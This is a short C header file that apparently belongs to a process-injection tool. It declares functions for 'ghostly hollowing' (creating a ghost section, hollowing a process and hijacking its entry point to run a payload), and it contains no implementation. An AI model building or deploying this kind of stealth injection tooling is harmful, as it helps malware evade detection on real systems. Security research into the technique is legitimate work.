#pragma once

#include <phnt.h>

DWORD GetEntryPointOffset(_In_ LPVOID PayloadAddress);
BOOL HijackExecution(_In_ PROCESS_INFORMATION HollowedProcess, _In_ LPVOID RemoteMappingAddress, _In_ DWORD EntryPointOffset);
HANDLE CreateGhostSection(_In_ HANDLE TempFile);
BOOL GhostlyHollowing(_In_ PROCESS_INFORMATION HollowedProcess, _In_ HANDLE GhostSection, _In_ LPVOID PayloadAddress);